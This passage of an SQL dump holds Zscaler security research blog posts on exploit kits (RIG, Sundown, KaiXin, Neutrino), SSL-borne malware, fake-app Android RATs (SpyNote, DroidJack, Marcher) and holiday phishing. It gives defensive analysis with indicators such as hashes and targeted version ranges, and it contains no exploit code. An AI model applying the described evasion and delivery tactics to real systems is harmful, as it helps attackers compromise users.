RIG gates and landing pages hosted in South America, Southeast Asia, and Australia. Previously, RIG hosts were mainly limited to Western Europe, North America, and Russia. These new hosts indicate an effort to increase the target demographics and potential victim pool worldwide for RIG-distributed ransomware.\r\n\r\n\r\n\r\nFigure 3: RIG compromised site injection\r\n\r\n\r\n\r\nFigure 4: RIG landing page\r\n\r\n\r\n\r\nFigure 5: RIG gate fingerprinting script\r\n\r\nSome recent RIG gates have included a browser fingerprinting script. This script supports the identification of several common browsers by version, but only redirects to a landing page if Internet Explorer is detected.\r\n\r\nBEPS, Xer, Sundown, Nebula?\r\n\r\nThe Sundown EK has been carving out a niche in the shadow of RIG for the last two years, but as we have noted before, the developers are putting continuous work into the kit to add (or steal) exploits. Recently, authors have been making significant changes to the Sundown landing page patterns, apparently rebranding the EK as \"Nebula.\" Where .xyz domains had been the primary choice for hosting landing pages, since February 9, 2017, the YBN has been registering domains with many other generic top-level domains (gTLDs) in the name of Brian Krebs.\r\n\r\n\r\n\r\nFigure 6: Brian Krebs Fan Club registration\r\n\r\nIn addition to changing the hostname patterns, the YBN has been changing URL path styles. Initially dropping the \"index.php\" component of the path, some of the Nebula Sundown cycles we are seeing utilize randomized formats that attempt to appear like mundane traffic patterns.\r\n\r\n\r\n\r\nFigure 7: Trouble getting the landing page with the new-style URLs from Nebula Sundown\r\n\r\nWhile the URL patterns have changed, the landing page used by the latest version of Sundown looks the same as landing pages seen from previous .xyz domains.\r\n\r\n\r\n\r\nFigure 8: Nebula Sundown landing page\r\n\r\nAs quickly as the Nebula Sundown strain gained attention, it seems to have dissipated, with typical Sundown cycles showing up once again since March 6, 2017. Sundown has primarily been dropping banker trojans, including the newly popular DiamondFox.\r\n\r\n\r\n\r\nFigure 9: No more Nebula Sundown; back to classic Sundown URLs\r\n\r\nKaiXin Exploit Kit\r\n\r\nKaiXin is a smaller exploit kit first identified in 2012. KaiXin typically targets Asian sites, and has been delivered via banner ads and JavaScript injection on compromised sites. In our previous EK roundup, we discussed KaiXin’s swell in activity and updates to its exploit chain.\r\n\r\nThis KaiXin campaign tapered off after activity in early December 2016. At the end of February, a new KaiXin campaign was observed reusing patterns from the summer of 2016.\r\n\r\n\r\n\r\nFigure 10: KaiXin script injection\r\n\r\nThis KaiXin campaign includes an older antivirus (AV) fingerprinting script that was absent in the fall CNZZ campaign. This script attempts to detect the presence of several personal security products on the client filesystem before continuing execution.\r\n\r\n\r\n\r\nFigure 11: Deobfuscated KaiXin AV fingerprinting script\r\n\r\nAfter the AV check passes, several layers of obfuscated scripts are loaded via iframes. This campaign uses a browser cookie to prevent repeated access to the exploit, and tries to block web crawler bots that self-identify in their user agent string.\r\n\r\n\r\n\r\nFigure 12: KaiXin cookie, crawler check\r\n\r\nThe final script in the exploit kit chain performs browser and runtime version checks, and serves the appropriate exploit file. Unlike the KaiXin campaign we analyzed in our last roundup, which performed browser fingerprinting on several browsers, this campaign only targets Internet Explorer.\r\n\r\n\r\n\r\nFigure 13: Deobfuscated KaiXin exploit delivery script\r\n\r\nThe KaiXin campaign offers exploits for Java, Flash, and Silverlight. Separate Java JAR exploits are included for JRE versions 1.7.0.6-11, 1.7.0.0-1.7.0.7, and versions older than 1.6.0.27. Two Flash exploits target versions 16,0,0,100-296 and 17,0,0,100-134, or Flash 11-15. Silverlight 4.0.50401.0 to 5.1.10411.0 is targeted, excluding 5.0.60818.0.\r\n\r\nThe URL for the infection payload is not hardcoded in the exploit packages; instead, it is passed as a parameter (“ckurl” in the example above) to the embedded object.\r\n\r\nLike previous KaiXin campaigns, successful exploitation delivers a downloader payload, which installs various Chinese adware packages. The payloads in this campaign use the names of Windows system binaries, such as “csrss.exe,” “dwm.exe,” and “svchost.exe.”\r\n\r\nMalware Traffic Analysis recently published a capture of a similar infection cycle for the same campaign.\r\n\r\nNeutrino Exploit Kit\r\n\r\nPropagation of the Neutrino EK abruptly shut down in September 2016. After several weeks, and then months, of no observed activity, security researchers considered Neutrino defunct. The RIG EK took over Neutrino’s role as the primary distributor of CryptXXX ransomware. A low-volume Neutrino variant dubbed Neutrino-v appeared in late 2016, but was mainly confined to targets in South Korea and Taiwan.\r\n\r\nIn January 2017, researchers began observing occasional hits of active Neutrino landing pages dropping ransomware payloads. It appears that Neutrino has returned in a limited capacity, likely restricted to privately commissioned EKs.\r\n\r\n \r\n\r\n\r\n\r\nFigure 14: Neutrino cycle featuring fake jquery gate and HTTPS redirector\r\n\r\n\r\n\r\nFigure 15: Neutrino exploit chain\r\n\r\nWe have observed a Neutrino campaign using a .space TLD gate. The landing page, exploit, and payload URLs follow typical Neutrino patterns.\r\n\r\n\r\n\r\nFigure 16: Neutrino script injection\r\n\r\n\r\n\r\nFigure 17: Neutrino landing page\r\n\r\nThis landing page in the .space gate campaign also keeps with the “space” theme, and displays a blurb about space and a dummy HTML form while serving the Flash exploit.\r\n\r\n\r\n\r\nFigure 18: Neutrino landing page in browser\r\n\r\nTerror Exploit Kit\r\n\r\nThe Terror EK is a newer exploit kit that appears to be cobbled together from pieces of Metasploit payloads as well as other EKs, most notably Sundown and Hunter. It primarily relies on recent Sundown exploits and dropper payloads to install ccminer, a cryptocurrency mining program, on infected computers.\r\n\r\n\r\n\r\nFigure 19: Recent Terror EK cycle\r\n\r\nWe\'ve continued tracking the development of this kit since we first spotted it, and have watched developers transition to new domains with stolen identities, with traffic coming from the PopAds advertising network. The landing page is more sophisticated, but remains a patchwork of stolen exploits and obfuscation routines.\r\n\r\nMagnitude Exploit Kit\r\n\r\nThe Magnitude EK continues to operate at low volume, with restricted regional distribution. We typically observe Magnitude affecting Southeast Asian users who visit illegal streaming sites. Malicious ads are distributed via ad networks such as PopAds, and vulnerable users are infected with Cerber.\r\n\r\n\r\n\r\nFigure 20: Magnitude cycle coming from advertising rotators\r\n\r\nConclusion\r\n\r\nExploit kits pose a significant threat to users during simple web browsing. In the case of ransomware infections, the result could be the inability of users to access their files. The techniques exploit kit authors use to hide their activities are frequently changing, and security researchers work hard to analyze and block these new threats.\r\n\r\nTo help avoid infections such as those delivered by way of exploit kits, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements. The ThreatLabZ research team has confirmed coverage for these top exploit kits and subsequent payloads, ensuring protection for organizations using Zscaler cloud-delivered Internet security.\r\n\r\nResearched by Ed Miles and Derek Gooley', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/top-exploit-kit-activity-roundup-winter-2017');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (77, 'The Rise in SSL-based Threats', 'Derek Gooley', 'February 16, 2017', 'Overview    The majority of Internet traffic is now encrypted. With the advent of free SSL providers like Let’s Encrypt, the move to encryption has become easy and free. On any given day in the Zscaler cloud, more than half of the traffic that is inspected uses SSL. It is no surprise, then, that malicious actors have also been using the SSL protocol in their activities over the last several years. The increasing use of SSL creates problems for organizations that are unable to monitor SSL traffic, as they must rely on less-effective techniques like IP and domain blocking in an attempt to identify and block threats.    In this report, we will outline trends we have seen in the use of SSL in the malware lifecycle and in adware distribution, based on a review of traffic on the Zscaler cloud from August 2016 through January 2017. What follows is a graphic illustrating our findings, and an analysis of recent activities.             Malicious SSL Activity    During the six-month period, the ThreatLabZ research team observed that the Zscaler cloud blocked an average 600,000 malicious activities each day that used SSL, including exploit kit traffic, malware and adware distribution, malware callbacks, and other malicious traffic.        Figure 1. Total SSL blocks, August 2016 – January 2017    In our cloud, we observed an overall increase in malicious SSL traffic in nearly all categories — a trend we expect to continue — with periodic spikes, such as those in early August and late November, when SSL malware blocks reached nearly two million a day.    Browser Exploits and Payload Delivery    Exploit kit (EK) authors are more frequently including SSL in the infection chain at some point. Previous malvertising campaigns have been observed in which EKs took advantage of SSL-enabled advertising networks to inject malicious scripts into legitimate webpages. EK authors may also abuse services that provide free SSL certificates to add HTTPS support to their maliciously controlled domains. This maneuver enables them to bypass the SSL integrity checks built into modern web browsers.        Figure 2. SSL web exploit monthly total hits, August 2016 – January 2017        Figure 3. SSL web exploit blocks, August 2016 – January 2017    During the observation period, we saw an average of 10,000 hits per month for web exploits that included SSL as part of the infection chain.    Phishing        Figure 4. Phishing blocks, August 2016 – January 2017    Phishing campaigns have been increasingly using SSL in their attacks. Many phishing attacks involve hosting the phishing page on a legitimate domain that has been compromised. Since the number of legitimate sites that support SSL is constantly increasing, so are the number of SSL-enabled phishing attacks. This rise presents a significant threat, because organizations, in an attempt to thwart ransomware and other phishing schemes, have implemented security hardware solutions to detect and block phishing, but few of them support SSL inspection.    Malware Families That Use SSL    Several years ago, it was rare to see malware using SSL to encrypt command-and-control (C&C) mechanisms. As malware design has become more sophisticated, and with the near ubiquity of SSL on the Internet, it made sense for malware authors to begin using SSL to hide their activities. Some malware families have gone further, using anonymity services such as Tor to hide the location of their C&C servers, connecting to (otherwise legitimate) HTTP Tor gateways via SSL.    Botnets typically use self-signed SSL certificates, frequently using the names and information of real companies to try to appear legitimate. The SSL Blacklist (https://sslbl.abuse.ch/) is a project that tracks the SSL certificates used by malware authors.        Figure 5. Malware callbacks over SSL, September 2016 – January 2017    Corresponding with the increase in malicious payload deliveries in November 2016, we also observed an increase in blocked malicious SSL traffic during that time.    In our analysis, we came across many malware families that were using SSL for malicious purposes. Some of the recent and notorious malware families actively using SSL are:    Dridex/Dyre/TrickLoader    The Dridex, Dyre, and TrickLoader banking Trojans are capable of communicating to the C&C servers via SSL using its own SSL certificate. These family previously used the common browser hooking technique for callbacks, but the latest versions can perform redirects via local proxy or local DNS poisoning to fake websites, controlled by the attacker.    Vawtrak    Vawtrak is a well-crafted piece of malware supporting the VNC and SOCKS proxies, screenshot and video capturing, and extensibility with regular updates from C&C servers. Vawtrak samples contain code for downloading and validating SSL certificates and are capable of initiating an HTTPS connection. The malware contains a list of HTTPS-secured hosts that contain updated lists of live C&C servers.    Gootkit    Gootkit is a stealth banking trojan with backdoor and spyware capabilities that uses fileless infection and communications over SSL. Gootkit intercepts user data via web injections into HTTPS traffic.    Adware    A common function of adware is to inject unwanted advertisements into web traffic. These advertisements can also lead to malicious infections, as exploit authors frequently take advantage of less-scrupulous advertising networks to distribute exploit redirect scripts. Securing web traffic with SSL/HTTPS prevents this distribution in most cases. Adware installed on a client machine would not be able to perform a man-in-the-middle attack with a self-signed certificate due to the HTTPS safeguards included in modern browsers.    However, in several notable cases, major adware distributions have circumvented these safeguards to inject advertisements into HTTPS traffic. The two most high-profiles examples are the Superfish and PrivDog adware distributions, which were first abusing SSL in 2015. Both of these adware programs install a self-signed root CA certificate onto the victim’s computer, and intercept all web traffic in order to inject advertisements into web pages. PrivDog in particular was a serious concern because it did not validate SSL certificates on its end of the proxy, allowing users to inadvertently navigate to websites with invalid SSL certificates, exposing them to additional threats.    Adware variants have also started to host their files on HTTPS sites. We came across a family of adware called InstallCore, which was doing this kind of activity. InstallCore is a Potentially Unwanted Application (PUA) that installs a program to display and/or download unwanted advertisements and toolbars, and tracks a computer\'s web usage to feed the victim undesired ad pop-ups; some versions can even hijack a browser’s start or search pages, redirecting the user to a different site or search engine.    InstallCore is often delivered by tricking the user into installing the Flash plugin or a Java update. In some cases, InstallCore is delivered by misdirected download buttons. These fake pop-ups of the Flash player or download buttons appear on content distribution sites, like torrent sites, or free software sites that work on HTTPS.        Figure 6. Fake Flash download pop-up    Conclusion    Due to the rising use of SSL encryption to hide exploit kits, malware, and other threats, it is important to have a security infrastructure that can detect and block these threats. The problem is that SSL inspection is compute-intensive, so even organizations whose security appliances support SSL inspection often disable this feature, as its use would slow traffic throughput to unacceptable levels. Dedicated appliances for SSL inspection are available, but their price puts them out of reach for many organizations. SSL inspection is built into the Zscaler security platform, which, due to its scale, can inspect all SSL traffic without latency.    Research by: Derek Gooley, Jithin Nair, Manohar Ghule', 'Encryption;Malware', 'https://www.zscaler.com/blogs/research/rise-ssl-based-threats');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (78, 'SpyNote RAT posing as Netflix app', 'Shivang Desai', 'January 23, 2017', 'Watch on Fox News: Hackers may use fake Netflix app to spy on users    As users have become more attached to their mobile devices, they want everything on those devices. There’s an app for just about any facet of one’s personal and professional life, from booking travel and managing projects, to buying groceries and binge-watching the latest Netflix series.    The iOS and Android apps for Netflix are enormously popular, effectively turning a mobile device into a television with which users can stream full movies and TV programs anytime, anywhere. But the apps, with their many millions of users, have captured the attention of the bad actors, too, who are exploiting the popularity of Netflix to spread malware.    Recently, the ThreatLabZ research team came across a fake Netflix app, which turned out to be a new variant of SpyNote RAT (Remote Access Trojan).    SpyNote RAT is capable of performing a variety of alarming functions that includes:      	  	Activating the device’s microphone and listening to live conversations  	  	  	Executing commands on the device  	  	  	Copying files from the device to a Command & Control (C&C) center  	  	  	Recording screen captures  	  	  	Viewing contacts  	  	  	Reading SMS messages  	      The screenshot below shows part of the sandbox’s report on the SpyNote RAT’s signature and detected functions:      	  		  			  			  			  		  		  			  			Figure 1 : Zscaler Cloud Sandbox Detection  			  		  	           The fake Netflix app we are analyzing in this blog appears to be built using an updated version of SpyNote RAT builder, which was leaked last year.    Technical details     Please note that our research is not about the legitimate Netflix app on Google Play.    The spyware in this analysis was portraying itself as the Netflix app. Once installed, it displayed the icon found in the actual Netflix app on Google Play.             	  		  			  			  			  		  		  			  			Figure 2: Fake Netflix vs. legitimate Netflix  			  		  	           As soon as the user clicks the spyware’s icon for the first time, nothing seems to happen and the icon disappears from the home screen. This is a common trick played by malware developers, making the user think the app may have been removed. But, behind the scenes, the malware has not been removed; instead it starts preparing its onslaught of attacks.    For contacting C&C, the spyware was found to be using free DNS services, as shown in the screenshot below:           	  		  			  			  			  		  		  			  			Figure 3: Server details  			  		  	           SpyNote RAT uses an unusual trick to make sure that it remains up and running and that the spying does not stop. It does so using the Services, Broadcast Receivers, and Activities components of the Android platform.    Services can perform long-running operations in the background and does not need a user interface. Broadcast Receivers are Android components that can register themselves for particular events. Activities are key building blocks, central to an app’s navigation, for example.    The SpyNote RAT registers a service called AutoStartup and a broadcast receiver named BootComplete.     MainActivity registers BootComplete with a boot event, so that whenever the device is booted, BootComplete gets triggered.    BootComplete starts the AutoStartup service and the AutoStartup service makes sure that MainActivity is always running.    What follows are some of the features exhibited by SpyNote RAT.    Command execution    Command execution can create havoc for victim if the malware developer decides to execute commands in the victim’s device. Leveraging this feature, the malware developer can root the device using a range of vulnerabilities, well-known or zero-day.    The following screenshot shows the command execution functionality in action:         	  		  			  			  			  		  		  			  			Figure 4: Command Execution  			  		  	           The paramString parameter shown in the above screenshot can be any command received from C&C.         Screen capture and audio recording     SpyNote RAT was able to take screen captures and, using the device’s microphone, listen to audio conversations. This capability was confirmed when the Android permission, called android.permission.RECORD_AUDIO, was being requested along with code found in the app.    SpyNote RAT captured the device’s screen activities along with audio using the  MediaProjectionCallback functionality (available with Lollipop, the Android 5.0 release, and later) and saved the output in a file named \"video.mp4\" as shown in the following screenshot:           	  		  			  			  			  		  		  			  			Figure 5 : Output File  			  		  	           SMS stealing     SpyNote RAT was also observed stealing SMS messages from the affected devices, as shown in screenshot below:           	  		  			  			  			  		  		  			  			Figure 6: Reading SMS messages  			  		  	           Stealing contacts    The ability to steal contacts is a favorite feature for spyware developers, as the stolen contacts can be used to further spread the spyware.    The following screenshot shows the contacts being stolen and written in a local array, which is  then sent to C&C:           	  		  			  			  			  		  		  			  			Figure 7: Stealing and writing contacts  			  		  	           Uninstalling apps    Uninstalling apps is another function favored by developers of Android spyware and malware. They tend to target any antivirus protections on the device and uninstall them, which increases the possibility of their malware persisting on the device. Following screenshot shows this functionality in action:           	  		  			  			  			  		  		  			  			Figure 8: Uninstalling functionality  			  		  	      Other functions    In addition to the functionalities we’ve described, the SpyNote RAT was exhibiting many other behaviors that make it more robust than most off-the-shelf malware.    SpyNote RAT was designed to function only over Wi-Fi, which is the preferable mode for Android malware to send files to C&C.    The screenshot below shows SpyNote RAT scanning for Wi-Fi and enabling it if a known channel is found:           	  		  			  			  			  		  		  			  			Figure 9 : Scanning Wi-Fi  			  		  	           Additional features    - SpyNote RAT could click photos using the device\'s camera, based on commands from C&C.    - There were two interesting sub-classes found inside Main Activity: Receiver and Sender. Receiver was involved in receiving commands from the Server and the  main functionality of Sender was to send all the data collected to the C&C over Wi-Fi.    - SpyNote RAT was also collecting the device’s location to identify the exact location of the victim.         SpyNote RAT builder    The SpyNote Remote Access Trojan (RAT) builder is gaining popularity in the hacking community, so we decided to study its pervasiveness. What we found were several other fake apps developed using the SpyNote builder, which should come as a warning to Android users. Some of the targeted apps were:      	  	Whatsapp  	  	  	YouTube Video Downloader  	  	  	Google Update  	  	  	Instagram  	  	  	Hack Wifi  	  	  	AirDroid  	  	  	WifiHacker  	        	  	Facebook  	  	  	Photoshop  	  	  	SkyTV  	        	  	Hotstar  	  	  	Trump Dash  	  	  	PokemonGo  	      With many more to come.    Furthermore, we found that in just the first two weeks of 2017, there have been more than 120 such spyware variants already built using the same SpyNote Trojan builder as SpyNote RAT and roaming in the wild. A complete list of sample hashes is available here.          Conclusion     The days when one needed in-depth coding knowledge to develop malware are long gone. Nowadays, script kiddies can build a piece of malware that can create real havoc. Moreover, there are many toolkits like the SpyNote Trojan builder that enable users to build malware with ease and few clicks.    In particular, avoid side-loading apps from third-party app stores and avoid the temptation to  play games that are not yet available on Android. Yes, we are talking about SuperMarioRun, which was recently launched by Nintendo only for iOS users. Recent blogs by the Zscaler research team explain how some variants of Android malware are exploiting the popularity of this game and tricking Android users into downloading a fake version. (Have a look here and here.)    You should also avoid the temptation to play games from sources other than legitimate app stores; such games are not safe and may bring harm to your reputation and your bank account.    Zscaler users are protected from such attacks with multiple levels of security.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/spynote-rat-posing-netflix-app');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (79, 'Super Mario Run Malware #2 – DroidJack RAT', 'Viral Gandhi', 'January 12, 2017', 'A few days back, we wrote about an Android Marcher trojan variant posing as the Super Mario Run game for Android. We have found another instance of malware posing as the Super Mario Run Android app, and this time it has taken the form of DroidJack RAT (remote access trojan). Proofpoint wrote about the DroidJack RAT side-loaded with the Pokemon GO app back in July 2016; the difference here is that there is no game included in the malicious package. The authors are trying to latch onto the popularity of the Super Mario Run game to target eagerly waiting Android users.    Details:      	Name : Super Mario Run  	Package Name : net.droidjack.server  	MD5 : 69b4b32e4636f1981841cbbe3b927560      Technical Analysis:    The malicious package claims to be the Super Mario Run game, as shown in the permissions screenshot below, but in reality this is a malicious RAT called DroidJack (also known as SandroRAT) that is getting installed.          Figure 1: Permissions.    Once installed, the RAT registers the infected device as shown below.        Figure 2: Infected device registration.    DroidJack RAT starts capturing sensitive information like call data, SMS data, videos, photos, etc. Observe below the code routine for call recording.         Figure 3: Call recording.    This RAT records all the calls and stores the recording to an “.amr” file.    The following is the code routine for video capturing.        Figure 4: Video capturing.    Here, the RAT stores all the captured videos in a “video.3gp” file.    It also harvests call details and SMS logs as shown below.        Figure 5: SMS Logs      Figure 6: Call logs.    Upon further inspection, we have observed that this RAT extracts WhatsApp data too.        Figure 7:Whatsapp data.    The RAT stores all the data in a database (DB) in order to send it to the Command & Control (C&C) server. The following are the DBs created and maintained by the RAT.        Figure 8: Databases.    We saw the following hardcoded C&C server location in the RAT package:        Figure 9: Hardcoded C&C.    Conclusion:    The DroidJack RAT is another example of a growing trend in which malware authors seek to exploit public interest as a way to spread malware. In this case, like others before, the event of a popular game release became an opportunity to trick unsuspecting users into downloading the RAT. As a reminder, it is always a good practice to download apps only from trusted app stores such as Google Play. This practice can be enforced by unchecking the \"Unknown Sources\" option under the \"Security\" settings of your device.    Zscaler ThreatLabZ is actively monitoring this malware to ensure that Zscaler customers are protected from infection.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/super-mario-run-malware-2-droidjack-rat');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (80, 'Android Marcher now posing as Super Mario Run', 'Viral Gandhi', 'January 05, 2017', 'Nintendo recently released Super Mario Run for the iOS platform. In no time, the game became a sensational hit on the iTunes store. However, there is not yet an Android version and there has been no official news on such a release. Attackers are taking advantage of the game\'s popularity, spreading malware posing as an Android version of Super Mario Run.    The ThreatLabZ team wrote about a similar scam that occurred during the release of another wildly popular Niantic game, Pokemon GO. Like that scam, the new Android Marcher Trojan is disguised as the Super Mario Run app and attempts to trick users with fake finance apps and a credit card page in an effort to capture banking details.    Marcher history    Marcher is a sophisticated banking malware strain that targets a wide variety of banking and financial apps and credit cards by presenting fake overlay pages. Once the user\'s mobile device has been infected, the malware waits for victims to open one of its targeted apps and then presents the fake overlay page asking for banking details. Unsuspecting victims will provide the details that will be harvested and sent out to to the malware\'s command and control (C&C) server. We have seen this malware evolve and take advantage of recent trends in order to target a large number of users. We have covered similar campaigns in the past related to Marcher malware here and here.    Technical details    In this new strain, the Marcher malware is disguised as the Super Mario Run app for Android. Knowing that Android users are eagerly awaiting this game, the malware will attempt to present a fake web page promoting its release.    Marcher malware details:      	  	Name : Super Mario Run  	  	  	Package Name : uiq.pizfbwzbvxmtkmtbhnijdsrhdixqwd  	  	  	MD5 : d332560f1fc3e6dc58d94d6fa0dab748  	  	  	Detections : 12/55(at time of analysis)  	      Upon installation, the malware asks for multiple permissions including administrative rights as shown below.        Fig. 1: Permissions     In previous variants of Marcher, we observed this malware family targeting well-known Australian, UK, and French banks. The current version is targeting account management apps as well as well-known banks. The following is a code snippet showing sample targeted apps:        Fig. 2: Targeted apps    The following is the full list of targeted apps by this variant:      	fr.lcl.android.customerarea - https://play.google.com/store/apps/details?id=fr.lcl.android.customerarea  	mobi.societegenerale.mobile.lappli - https://play.google.com/store/apps/details?id=mobi.societegenerale.mobile.lappli  	com.cic_prod.bad - https://play.google.com/store/apps/details?id=com.cic_prod.bad  	net.bnpparibas.mescomptes - https://play.google.com/store/apps/details?id=net.bnpparibas.mescomptes  	com.rbs.mobile.android.ubr - https://play.google.com/store/apps/details?id=com.rbs.mobile.android.ubr  	com.grppl.android.shell.halifax - https://play.google.com/store/apps/details?id=com.grppl.android.shell.halifax  	com.fullsix.android.labanquepostale.accountaccess - https://play.google.com/store/apps/details?id=com.fullsix.android.labanquepostale.accountaccess  	com.barclays.android.barclaysmobilebanking - https://play.google.com/store/apps/details?id=com.barclays.android.barclaysmobilebanking  	com.caisseepargne.android.mobilebanking - https://play.google.com/store/apps/details?id=com.caisseepargne.android.mobilebanking  	com.rbs.mobile.android.rbs -  https://play.google.com/store/apps/details?id=com.rbs.mobile.android.rbs  	fr.banquepopulaire.cyberplus - https://play.google.com/store/apps/details?id=fr.banquepopulaire.cyberplus  	com.htsu.hsbcpersonalbanking - https://play.google.com/store/apps/details?id=com.htsu.hsbcpersonalbanking  	fr.creditagricole.androidapp - https://play.google.com/store/apps/details?id=fr.creditagricole.androidapp  	uk.co.tsb.mobilebank - https://play.google.com/store/apps/details?id=uk.co.tsb.mobilebank  	com.grppl.android.shell.CMBlloydsTSB73 - https://play.google.com/store/apps/details?id=com.grppl.android.shell.CMBlloydsTSB73  	com.grppl.android.shell.BOS - https://play.google.com/store/apps/details?id=com.grppl.android.shell.BOS  	com.rbs.mobile.android.natwest - https://play.google.com/store/apps/details?id=com.rbs.mobile.android.natwest  	uk.co.santander.santanderUK - https://play.google.com/store/apps/details?id=uk.co.santander.santanderUK      Like previous Marcher variants, the current version also presents fake credit card pages once an infected victim opens the Google Play store. The malware locks out Google Play until the user supplies the credit card information as shown below:        Fig. 3: Fake credit card page    However, the banking overlay pages served by the C&C were not functioning properly at the time of this writing. We suspect that the malware variant is still under development.        Fig. 4: Error page    In the current variant, we have observed a new obfuscation technique, in which all important string characters are delimited with \'<<zB5>>\' as shown below.        Fig. 5: Encoded strings    The code snippet below shows the hardcoded C&C location.        Fig. 6: C&C location    Conclusion    Android Marcher has been around since 2013 and continues to actively target mobile users\' financial information. To avoid becoming a victim of such malware, it is a good practice to download apps only from trusted app stores such as Google Play. This practice can be enforced by unchecking the \"Unknown Sources\" option under the \"Security\" settings of your device.    Zscaler ThreatLabZ is actively monitoring this variant of the Android Marcher malware to ensure that Zscaler customers are protected.', 'Mobile', 'https://www.zscaler.com/blogs/research/android-marcher-now-posing-super-mario-run');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (81, 'Santa Claus is coming to town with a sack full of ransomware', 'Chris Mannon', 'December 20, 2016', 'It’s the season: holiday shopping has increased and email inboxes have been inundated with promotional emails, offers from online retailers, and discount banners. And with increased online shopping activity, you can expect to see an increase in activity from the bad actors, too. Cybercriminals are taking advantage of the bustling season by launching various social engineering attacks, including phishing and drive-by download campaigns, to deliver ransomware.\r\n\r\nThreat actors leverage keywords to create reasonable doubt in the victim\'s browsing experience as a lure to attack. Cybercriminals exploit users through the tried and true tactic of sending spam emails. Ransomware strains target victims by posing as an attachment or link to a receipt for an order that the user made.\r\n\r\n\r\nFigure 1 - Security events seen for Holiday Shopping\r\n\r\nOnline shoppers are bombarded with banners and pop-ups offering discounts and free shipping. Even for experienced users, it can be difficult to differentiate between ads from legitimate sources and those that are created by malicious users. As users have learned to be more careful — like resisting the temptation to open executable files — criminals have had to get more creative. Fake gift cards that were once delivered as executable files are now being embedded in malformed Word documents. Such documents contain a VBScript (macro), which (when opened) will download a malicious executable that can deliver ransomware and other trojans.\r\n\r\n\r\n\r\nFigure 2 - Example of a phishing page offering an Amazon gift card.\r\n\r\nCybercriminals are also sending phishing emails with fake package tracking numbers, bogus discounts, or coupons that link to phishing sites. With so many online orders being shipped, it is difficult to differentiate between the genuine email notifications and the frauds. Recently, we have observed a huge email spam campaign with a fake Amazon notification that includes a ZIP attachment containing a malicious JavaScript file. This malicious JavaScript will download and execute Locky ransomware. (Read more about Locky here.)\r\n\r\n\r\n\r\nFigure 3 - Example of phishing mail with fake Amazon notification.\r\n\r\nWe urge customers to use caution with all email in light of the prevalence of phishing attacks, which are increasing in both frequency and sophistication. Guidelines provided by Amazon can help in identifying phishing emails. A detailed report with more examples of phishing attacks posing as Amazon notifications has been published by Microsoft.\r\n\r\nThe following table shows several suspicious file names that should raise your suspicions. You can see that several are executables, while the others are receipts and invoices, which are rarely sent as attached files by legitimate retailers.\r\n\r\n\r\n	\r\n		\r\n			Payslip_Dec_2016_218467.doc\r\n			 \r\n			receipt5343.exe\r\n			 \r\n			INVOICE.doc\r\n			 \r\n		\r\n		\r\n			invoice_scott.doc\r\n			 \r\n			invoice8003820.doc\r\n			 \r\n			Copy_2016_0989_PDF.scr\r\n			 \r\n		\r\n		\r\n			invoice.exe\r\n			 \r\n			IMG-DOC0008-20161011_Pdf.exe\r\n			 \r\n			002 order.exe\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nThe chart below shows phishing traffic trends over the last 30 days based on different URL categories, such as stores, games, seasonal, and mobile phishing.\r\n\r\n\r\n\r\nFigure 4 - Phishing trends categorized by URL categories.\r\n\r\nWe been observing higher than usual phishing traffic for store-related scams. Below are a few examples of different types of phishing attacks that have been designed to look like online stores, deals, branded products, and tech support websites.\r\n\r\n\r\n\r\nFigure 5 - Fake webstore made to resemble the Apple App Store.\r\n\r\n \r\n\r\n\r\n\r\nFigure 6 - Fake Amazon sales website.\r\n\r\n \r\n\r\n\r\n\r\nFigure 7 - Fake specialty brand discount website.\r\n\r\n \r\n\r\n\r\n\r\nFigure 8 - Fake tech support website.\r\n\r\nFamily technical support\r\n\r\nIt\'s the time of year when we all get to celebrate with our families. For some of us, though, this will mean online shopping with all its potential pitfalls. And for some it will mean new devices and appliances to connect — with oblique instructions and undoubtedly some questions. Here are some tips to help keep you and yours safe and secure through the holidays and into the new year.\r\n\r\n\r\n	Inspect the source of emails, especially those with enticing shopping deals; be wary of all attachments and don\'t open anything suspicious\r\n	Steer clear of unofficial mobile application stores\r\n	Ensure you have secure connections (HTTPS) to online retailers and banking sites\r\n	Check the authenticity of the URL or website address before clicking on a link\r\n	Stay away from emailed invoices; this is often a social engineering technique used by cybercriminals\r\n	Do not use unsecured public Wi-Fi for shopping\r\n	Use two-factor authentication whenever possible, especially on sensitive accounts such as those used for banking\r\n	Always ensure that your operating system and web browser have the latest security patches installed\r\n	Use browser add-ons like Adblock Plus to block popups and potential malvertisements\r\n	Back up your documents and media files\r\n	Review the Identity Theft Guide and FAQ from the Federal Trade Commission\r\n	Change the default password on your newly purchased IoT devices, such as your IP cameras, router, and smart TV', 'Abuse;Adware;Analysis;Exploit;Malware;Phishing;Ransomware;Scam;Spam', 'https://www.zscaler.com/blogs/research/santa-claus-coming-town-sack-full-ransomware-0');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (82, 'Top Exploit Kit Activity Roundup - Fall 2016', 'Derek Gooley', 'December 07, 2016', 'Overview    This is the third in a series of blogs reviewing the activity of the current top exploit kits. Exploit Kits (EKs) are rapidly deployable software packages designed to leverage vulnerabilities in web browsers as a way to deliver a malicious payload to a victim’s computer. Authors of EKs offer their services for sale, distributing malware for other malicious actors.    Since our last roundup, there have been significant changes in several EKs. Neutrino, a very active EK during the summer, went offline in late September. RIG EK activity has increased, especially with the shutdown of Neutrino. New variants of Neutrino and RIG appeared in October, with modifications to their URL patterns and JavaScript source.    You can read our previous roundup here.    Neutrino Exploit Kit    Following the shutdown of Angler EK in June, Neutrino activity significantly increased to fill the hole it left. Neutrino became a primary EK for malvertising campaigns as well as the main distributor of CryptXXX ransomware payloads.    From late July through late September, Neutrino was frequently observed delivering CrypMIC, a recent CryptXXX variant, via the pseudoDarkleech and EITest campaigns. Other smaller campaigns were seen dropping Locky ransomware and a variety of malware payloads.    In late September, all 